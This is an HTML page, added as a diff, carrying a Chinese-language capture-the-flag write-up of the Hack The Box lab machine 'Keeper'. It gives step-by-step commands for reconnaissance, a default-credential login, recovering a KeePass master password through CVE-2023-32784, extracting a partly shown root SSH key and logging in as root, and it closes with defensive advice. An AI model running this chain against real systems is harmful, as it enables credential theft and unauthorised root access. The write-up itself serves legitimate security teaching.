@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: Keeper | HackwithControler</title>
+<link rel="stylesheet" href="../static/css/main.css">
+</head>
+<body>
+<header>
+    <div class="container">
+        <a href="../index.html" class="back">← 返回首頁</a>
+    </div>
+</header>
+
+<div class="article-layout">
+    <!-- Left Sidebar: Article List -->
+    <aside class="sidebar-left">
+        <h3>📝 其他 Write-ups</h3><div class="sidebar-articles">
+            <a href="htb_pilgrimage.html" class="sidebar-article-item">
+                <div class="sidebar-article-title">HTB: Pilgrimage</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty easy">Easy</span>
+                    <span>2024-09-18</span>
+                </div>
+            </a>
+            <a href="htb_keeper.html" class="sidebar-article-item active">
+                <div class="sidebar-article-title">HTB: Keeper</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty easy">Easy</span>
+                    <span>2024-10-05</span>
+                </div>
+            </a>
+            <a href="htb_surveillance.html" class="sidebar-article-item">
+                <div class="sidebar-article-title">HTB: Surveillance</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty medium">Medium</span>
+                    <span>2024-11-20</span>
+                </div>
+            </a>
+            <a href="htb_analytics.html" class="sidebar-article-item">
+                <div class="sidebar-article-title">HTB: Analytics</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty easy">Easy</span>
+                    <span>2024-12-15</span>
+                </div>
+            </a></div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="article-main">
+        <div class="article-header">
+            <h1>HTB: Keeper</h1>
+            <div class="article-meta">
+                <span class="difficulty easy">Easy</span>
+                <span>📅 2024-10-05</span>
+                <span>⏱ 23 min read</span>
+            </div>
+            <div class="article-tags"><span class="article-tag">HTB</span><span class="article-tag">Linux</span><span class="article-tag">Request Tracker</span><span class="article-tag">KeePass</span><span class="article-tag">CVE-2023-32784</span></div>
+        </div>
+        <div class="article-content"><h2 id="_1">機器資訊</h2>
+<ul>
+<li>平台: Hack The Box</li>
+<li>難度: Easy</li>
+<li>IP: 10.10.11.227</li>
+<li>作業系統: Linux (Debian)</li>
+</ul>
+<h2 id="_2">偵察</h2>
+<h3 id="nmap">Nmap 掃描</h3>
+<pre class="codehilite"><code class="language-bash">nmap -sC -sV -oN nmap/keeper 10.10.11.227
+</code></pre>
+
+<p>開放端口：<br />
+- <strong>22/tcp</strong> - SSH (OpenSSH 8.9p1)<br />
+- <strong>80/tcp</strong> - HTTP (nginx 1.18.0)</p>
+<h3 id="web">Web 枚舉</h3>
+<p>訪問 <code>http://10.10.11.227</code> 重定向到 <code>http://tickets.keeper.htb/rt/</code></p>
+<p>添加到 hosts 文件：</p>
+<pre class="codehilite"><code class="language-bash">echo &quot;10.10.11.227 keeper.htb tickets.keeper.htb&quot; | sudo tee -a /etc/hosts
+</code></pre>
+
+<p>網站運行 <strong>Request Tracker (RT)</strong> 票務系統。</p>
+<h2 id="initial-access">Initial Access</h2>
+<h3 id="request-tracker">Request Tracker 預設憑證</h3>
+<p>嘗試預設憑證登入：</p>
+<pre class="codehilite"><code>Username: root
+Password: password
+</code></pre>
+
+<p>成功登入管理介面！</p>
+<h3 id="_3">用戶枚舉</h3>
+<p>在 Admin → Users 找到兩個用戶：</p>
+<ol>
+<li><strong>root</strong> (Admin)</li>
+<li><strong>lnorgaard</strong> (Lise Nørgaard)</li>
+</ol>
+<p>查看 lnorgaard 的用戶資料，在備註欄發現：</p>
+<pre class="codehilite"><code>Initial password: Welcome2023!
+</code></pre>
+
+<h3 id="ssh">SSH 登入</h3>
+<pre class="codehilite"><code class="language-bash">ssh lnorgaard@10.10.11.227
+# Password: Welcome2023!
+</code></pre>
+
+<p>成功登入並取得 user flag：</p>
+<pre class="codehilite"><code class="language-bash">cat ~/user.txt
+</code></pre>
+
+<h2 id="_4">權限提升</h2>
+<h3 id="_5">檔案發現</h3>
+<p>在用戶主目錄發現兩個有趣的檔案：</p>
+<pre class="codehilite"><code class="language-bash">ls -la ~
+</code></pre>
+
+<pre class="codehilite"><code>RT30000.zip
+KeePassDumpFull.dmp
+</code></pre>
+
+<h3 id="_6">下載檔案</h3>
+<pre class="codehilite"><code class="language-bash">scp lnorgaard@10.10.11.227:~/RT30000.zip .
+scp lnorgaard@10.10.11.227:~/KeePassDumpFull.dmp .
+</code></pre>
+
+<p>解壓 ZIP 檔：</p>
+<pre class="codehilite"><code class="language-bash">unzip RT30000.zip
+</code></pre>
+
+<p>得到：<br />
+- <code>passcodes.kdbx</code> - KeePass 資料庫<br />
+- <code>KeePassDumpFull.dmp</code> - 記憶體傾印檔</p>
+<h3 id="keepass">KeePass 資料庫</h3>
+<p>嘗試用常見密碼打開 <code>.kdbx</code> 檔案失敗。</p>
+<p>但我們有記憶體 dump 檔案！</p>
+<h3 id="cve-2023-32784-keepass-master-password-dumper">CVE-2023-32784 - KeePass Master Password Dumper</h3>
+<p>KeePass 2.X 版本存在一個嚴重漏洞，可以從記憶體或交換檔案中恢復主密碼。</p>
+<p><strong>漏洞原理：</strong><br />
+- KeePass 在處理主密碼時會將字符逐個加入 SecureString<br />
+- 每個字符的殘留數據會留在記憶體中<br />
+- 可以通過模式匹配恢復密碼（除了第一個字符）</p>
+<h3 id="poc">使用 POC 工具</h3>
+<pre class="codehilite"><code class="language-bash">git clone https://github.com/vdohney/keepass-password-dumper
+cd keepass-password-dumper
+dotnet run ~/KeePassDumpFull.dmp
+</code></pre>
+
+<p>輸出：</p>
+<pre class="codehilite"><code>Found: ●ødgrød med fløde
+</code></pre>
+
+<p>第一個字符是未知的（用 ● 表示），但後面的字符是清晰的。</p>
+<h3 id="_7">破解主密碼</h3>
+<p><code>ødgrød med fløde</code> 看起來像丹麥語。Google 搜索發現這是一道丹麥傳統甜點：</p>
+<p><strong>Rødgrød med fløde</strong> （紅漿果布丁配奶油）</p>
+<p>嘗試完整密碼：</p>
+<pre class="codehilite"><code class="language-bash">keepassxc-cli open passcodes.kdbx
+# Enter password: rødgrød med fløde
+</code></pre>
+
+<p>成功打開！</p>
+<h3 id="_8">提取憑證</h3>
+<pre class="codehilite"><code class="language-bash">keepassxc-cli show passcodes.kdbx &quot;keeper.htb (Ticketing Server)&quot;
+</code></pre>
+
+<p>找到 root 用戶的 SSH 密鑰和 PuTTY 格式的私鑰！</p>
+<h3 id="putty">PuTTY 私鑰提取</h3>
+<p>在 Notes 欄位發現完整的 PuTTY 私鑰：</p>
+<pre class="codehilite"><code>PuTTY-User-Key-File-3: ssh-rsa
+Encryption: none
+Comment: rsa-key-20230519
+Public-Lines: 6
+AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
+8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
+...（省略）...
+</code></pre>
+
+<h3 id="putty-openssh">轉換 PuTTY 密鑰為 OpenSSH 格式</h3>
+<p>將 PuTTY 密鑰內容保存為 <code>root.ppk</code>，然後轉換：</p>
+<pre class="codehilite"><code class="language-bash">puttygen root.ppk -O private-openssh -o root.key
+chmod 600 root.key
+</code></pre>
+
+<h3 id="ssh-root">SSH 以 Root 登入</h3>
+<pre class="codehilite"><code class="language-bash">ssh -i root.key root@10.10.11.227
+</code></pre>
+
+<p>成功獲得 root shell！</p>
+<pre class="codehilite"><code class="language-bash">cat /root/root.txt
+</code></pre>
+
+<h2 id="flags">Flags</h2>
+<pre class="codehilite"><code>user.txt: 9********************************5
+root.txt: f********************************c
+</code></pre>
+
+<h2 id="_9">總結</h2>
+<p>Keeper 是一個很棒的 Easy 級別機器，教導了多個重要概念：</p>
+<h3 id="_10">攻擊路徑</h3>
+<ol>
+<li><strong>預設憑證</strong> → RT Admin 訪問</li>
+<li><strong>資訊洩露</strong> → 用戶密碼</li>
+<li><strong>SSH 訪問</strong> → 用戶權限</li>
+<li><strong>CVE-2023-32784</strong> → KeePass 主密碼恢復</li>
+<li><strong>憑證提取</strong> → Root SSH 密鑰</li>
+<li><strong>密鑰轉換</strong> → Root 訪問</li>
+</ol>
+<h3 id="_11">學習要點</h3>
+<ul>
+<li>始終嘗試預設憑證</li>
+<li>注意應用程式中的註解和備註</li>
+<li>KeePass 記憶體漏洞的實際利用</li>
+<li>PuTTY 與 OpenSSH 密鑰格式轉換</li>
+<li>密碼管理器的安全性</li>
+</ul>
+<h3 id="_12">防禦建議</h3>
+<ol>
+<li><strong>更改預設憑證</strong>：所有系統都應該更改預設密碼</li>
+<li><strong>避免明文密碼</strong>：不要在票務系統或文檔中存儲密碼</li>
+<li><strong>更新 KeePass</strong>：升級到修復 CVE-2023-32784 的版本</li>
+<li><strong>限制記憶體 Dump</strong>：保護進程記憶體不被非授權訪問</li>
+<li><strong>SSH 密鑰保護</strong>：使用密碼保護私鑰</li>
+</ol>
+<h3 id="_13">工具</h3>
+<ul>
+<li><strong>keepass-password-dumper</strong>: CVE-2023-32784 利用工具</li>
+<li><strong>KeePassXC</strong>: 跨平台密碼管理器</li>
+<li><strong>PuTTYgen</strong>: 密鑰格式轉換工具</li>
+</ul>
+<h2 id="_14">參考資料</h2>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32784">CVE-2023-32784 - KeePass Master Password Disclosure</a></li>
+<li><a href="https://docs.bestpractical.com/rt/">Request Tracker Documentation</a></li>
+<li><a href="https://keepass.info/help/base/security.html">KeePass Security Issues</a></li>
+</ul></div>
+    </main>
+
+    <!-- Right Sidebar: TOC -->
+    <aside class="sidebar-right">
+        <h3>📑 目錄</h3><ul class="toc-list">
+            <li class="toc-item toc-item-h2">
+                <a href="#_1" class="toc-link">機器資訊</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_2" class="toc-link">偵察</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#nmap" class="toc-link">Nmap 掃描</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#web" class="toc-link">Web 枚舉</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#initial-access" class="toc-link">Initial Access</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#request-tracker" class="toc-link">Request Tracker 預設憑證</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_3" class="toc-link">用戶枚舉</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#ssh" class="toc-link">SSH 登入</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_4" class="toc-link">權限提升</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_5" class="toc-link">檔案發現</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_6" class="toc-link">下載檔案</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#keepass" class="toc-link">KeePass 資料庫</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#cve-2023-32784-keepass-master-password-dumper" class="toc-link">CVE-2023-32784 - KeePass Master Password Dumper</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#poc" class="toc-link">使用 POC 工具</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_7" class="toc-link">破解主密碼</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_8" class="toc-link">提取憑證</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#putty" class="toc-link">PuTTY 私鑰提取</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#putty-openssh" class="toc-link">轉換 PuTTY 密鑰為 OpenSSH 格式</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#ssh-root" class="toc-link">SSH 以 Root 登入</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#flags" class="toc-link">Flags</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_9" class="toc-link">總結</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_10" class="toc-link">攻擊路徑</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_11" class="toc-link">學習要點</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_12" class="toc-link">防禦建議</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_13" class="toc-link">工具</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_14" class="toc-link">參考資料</a>
+            </li></ul>
+    </aside>
+</div>
+
+<footer>
+    <div class="container">
+        <p>&copy; 2024 HackwithControler. All rights reserved.</p>
+    </div>
+</footer>
+
+<script src="../static/js/article.js"></script>
+</body>
+</html>
